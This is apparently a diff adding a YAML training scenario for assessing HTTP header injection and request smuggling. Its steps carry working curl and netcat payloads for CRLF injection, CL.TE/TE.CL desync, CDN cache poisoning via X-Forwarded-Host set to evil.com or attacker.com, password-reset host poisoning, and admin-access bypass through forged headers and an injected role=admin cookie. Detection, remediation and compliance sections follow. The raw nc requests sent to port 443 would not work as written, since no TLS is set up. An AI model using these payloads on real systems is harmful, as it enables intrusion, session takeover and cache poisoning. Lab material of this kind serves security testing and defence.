@@ -1,0 +1,169 @@
+# Category: Web Application Security - Protocol Attacks
+name: "HTTP Header Injection & Desync Attack Assessment"
+id: "web-header-injection-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "advanced"
+estimated_time: "55 minutes"
+
+description: |
+  Assess applications for HTTP header injection vulnerabilities that enable
+  request smuggling, cache poisoning, and authentication bypass. Test CL.TE,
+  TE.CL, and HTTP/2 desync variants with compliance mapping to OWASP API
+  Security and SOC 2 monitoring controls.
+
+learning_objectives:
+  - Identify header injection vectors in custom and standard HTTP headers
+  - Craft CL.TE and TE.CL request smuggling payloads
+  - Exploit header injection for cache poisoning or auth bypass
+  - Map findings to OWASP API Security and SOC 2 CC7.1 detection requirements
+
+tools:
+  - burp_suite_professional
+  - httpx
+  - curl
+  - smuggler
+  - custom_desync_scanner
+
+prerequisites:
+  - Target application behind reverse proxy or load balancer
+  - Authorization for HTTP protocol fuzzing and desync testing
+  - Understanding of HTTP/1.1 chunked encoding and Content-Length semantics
+  - Valid authentication token if testing authenticated endpoints
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Identify header injection points and proxy behavior"
+    commands:
+      - "# Test custom header reflection"
+      - "curl -i -H 'X-Custom-Input: test%0d%0aX-Injected:success' https://[target_url]/api/echo"
+      - "# Check if headers are logged or reflected in responses"
+      - "curl -s https://[target_url]/debug/headers | grep -i 'x-custom'"
+      - "# Identify reverse proxy via Server/Header analysis"
+      - "curl -i -s https://[target_url] | grep -iE 'server|x-powered-by|via|x-cache'"
+      - "# Test for HTTP/2 support (affects desync techniques)"
+      - "curl --http2 -s -o /dev/null -w '%{http_version}' https://[target_url]"
+    expected_output: "Confirmation of header reflection, proxy type, and HTTP version support"
+    detection: "Proxy logs showing unusual header values; WAF alerts for header injection patterns"
+
+  - id: step2
+    phase: "enumeration"
+    action: "Test for request smuggling prerequisites"
+    commands:
+      - "# Test CL.CL behavior (duplicate Content-Length)"
+      - "printf 'POST / HTTP/1.1\\r\\nHost: [target_domain]\\r\\nContent-Length: 0\\r\\nContent-Length: 43\\r\\n\\r\\nGET /smuggle-test HTTP/1.1\\r\\nX-Foo: x' | nc [target_domain] 443"
+      - "# Test CL.TE behavior (Content-Length + Transfer-Encoding)"
+      - "printf 'POST / HTTP/1.1\\r\\nHost: [target_domain]\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc [target_domain] 443"
+      - "# Test TE.CL behavior (Transfer-Encoding first)"
+      - "printf 'POST / HTTP/1.1\\r\\nHost: [target_domain]\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc [target_domain] 443"
+      - "# Use smuggler.py for automated desync detection"
+      - "python3 smuggler.py -u https://[target_url] -t 10"
+    expected_output: "Evidence of request smuggling vulnerability (CL.TE, TE.CL, or HTTP/2 desync)"
+    compliance_mapping: ["OWASP API Security Top 10 - API8:2023", "SOC 2 CC7.1"]
+
+  - id: step3
+    phase: "exploitation"
+    action: "Exploit header injection for cache poisoning"
+    commands:
+      - "# Inject Cache-Control header via user input"
+      - "curl -i 'https://[target_url]/api/data?callback=test%0d%0aCache-Control:max-age=31536000,public'"
+      - "# Poison CDN cache with injected response"
+      - "curl -i -H 'Host: [target_domain]' -H 'X-Forwarded-Host: evil.com' 'https://[cdn_endpoint]/static/app.js'"
+      - "# Verify poisoned asset is served"
+      - "curl -s 'https://[cdn_endpoint]/static/app.js' | grep -i 'evil.com'"
+      - "# Test X-Forwarded-Host injection for host header attacks"
+      - "curl -i -H 'X-Forwarded-Host: attacker.com' 'https://[target_url]/password-reset'"
+    expected_output: "Cached response containing attacker-controlled content or redirected password reset"
+    risk_level: "critical"
+    detection: "CDN logs showing cache key collisions; WAF alerts for Host header manipulation"
+
+  - id: step4
+    phase: "exploitation"
+    action: "Exploit header injection for authentication bypass"
+    commands:
+      - "# Inject X-Original-URL to bypass path-based auth"
+      - "curl -i -H 'X-Original-URL: /admin/dashboard' 'https://[target_url]/public/page'"
+      - "# Test X-Forwarded-For IP allowlist bypass"
+      - "curl -i -H 'X-Forwarded-For: 127.0.0.1' 'https://[target_url]/admin/api/users'"
+      - "# Inject cookie via Set-Cookie header reflection"
+      - "curl -i -c /tmp/injected_cookies.txt 'https://[target_url]/login?redirect=/home%0d%0aSet-Cookie:role=admin'"
+      - "# Use injected cookie for privileged access"
+      - "curl -i -b /tmp/injected_cookies.txt 'https://[target_url]/admin/settings'"
+    expected_output: "Successful access to admin functionality or privileged API endpoints"
+    compliance_mapping: ["OWASP API Security Top 10 - API2:2023", "PCI DSS v4.0-8.3.1"]
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Validate detection controls and document remediation"
+    commands:
+      - "# Test if WAF blocks desync payloads after remediation"
+      - "printf 'POST / HTTP/1.1\\r\\nHost: [target_domain]\\r\\nContent-Length: 0\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc [target_domain] 443"
+      - "# Verify header encoding in application framework"
+      - "# Check Express: res.setHeader() auto-encodes; Django: HttpResponse headers are sanitized"
+      - "# Export PoC for security team"
+      - "cat > /tmp/header_injection_poc.txt << 'EOF'\n# CL.TE Smuggling PoC\nPOST / HTTP/1.1\nHost: [target_domain]\nContent-Length: 4\nTransfer-Encoding: chunked\n\n0\n\nX\nEOF"
+    expected_output: "Validation of WAF/framework protections and documented remediation steps"
+    compliance_mapping: ["SOC 2 CC7.2", "NIST 800-53 SI-4"]
+
+detection:
+  network_indicators:
+    - "HTTP requests with duplicate or conflicting Content-Length/Transfer-Encoding headers"
+    - "Requests containing %0d%0a or raw CRLF in header values"
+    - "Unusual Host, X-Forwarded-*, or custom header values from single source"
+  log_indicators:
+    - "Reverse proxy logs: Request parsing errors or ambiguous content length"
+    - "Application logs: Header values containing CR/LF characters"
+    - "WAF logs: Blocked requests matching desync or header injection rule IDs"
+  endpoint_indicators:
+    - "Burp Suite HTTP Smuggler or smuggler.py execution"
+    - "netcat/nc commands with raw HTTP smuggling payloads"
+    - "Custom scripts iterating over header injection encoding variants"
+
+remediation:
+  immediate:
+    - "Normalize and sanitize all HTTP headers before processing; reject requests with CRLF in header values"
+    - "Configure reverse proxy to reject ambiguous requests (duplicate Content-Length, mixed TE/CL)"
+    - "Disable HTTP/1.0 support and enforce strict HTTP/1.1 or HTTP/2 parsing"
+  long_term:
+    - "Deploy WAF rules for request smuggling patterns (OWASP CRS 920270-920273)"
+    - "Implement header allowlisting: reject unknown or unexpected custom headers"
+    - "Add desync testing to automated security pipeline (smuggler.py in CI/CD)"
+    - "Conduct quarterly HTTP protocol security reviews per SOC 2 CC7.1 evidence"
+
+compliance_controls:
+  - standard: "OWASP API Security Top 10 2023"
+    control: "API8:2023-Security Misconfiguration"
+    description: "Missing or misconfigured security controls in HTTP protocol handling"
+  - standard: "SOC 2 Type II"
+    control: "CC7.1"
+    description: "Security events including protocol anomalies are detected and monitored"
+  - standard: "NIST 800-53 Rev. 5"
+    control: "SI-4"
+    description: "System monitoring to detect protocol-level attacks and anomalies"
+  - standard: "PCI DSS v4.0"
+    control: "6.5.10"
+    description: "Broken authentication via header manipulation and request smuggling"
+
+variables:
+  target_url: "https://app.example.com"
+  target_domain: "app.example.com"
+  cdn_endpoint: "https://cdn.example.com"
+  proxy_ip: "203.0.113.10"
+
+assessment_questions:
+  - "What is the difference between CL.TE and TE.CL request smuggling variants?"
+  - "How does HTTP/2 change the attack surface for request desync vulnerabilities?"
+  - "Which WAF rule IDs in OWASP CRS detect HTTP smuggling attempts?"
+  - "Why is header allowlisting more secure than blocklist-based filtering?"
+  - "How would you test if a CDN cache is vulnerable to poisoning via header injection?"
+
+references:
+  - url: "https://portswigger.net/web-security/request-smuggling"
+    title: "HTTP Request Smuggling - PortSwigger Research"
+  - url: "https://github.com/defparam/smuggler"
+    title: "smuggler - HTTP Request Smuggling Detection Tool"
+  - url: "https://owasp.org/www-project-api-security/"
+    title: "OWASP API Security Top 10"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Smuggling_Cheat_Sheet.html"
+    title: "OWASP HTTP Smuggling Cheat Sheet"
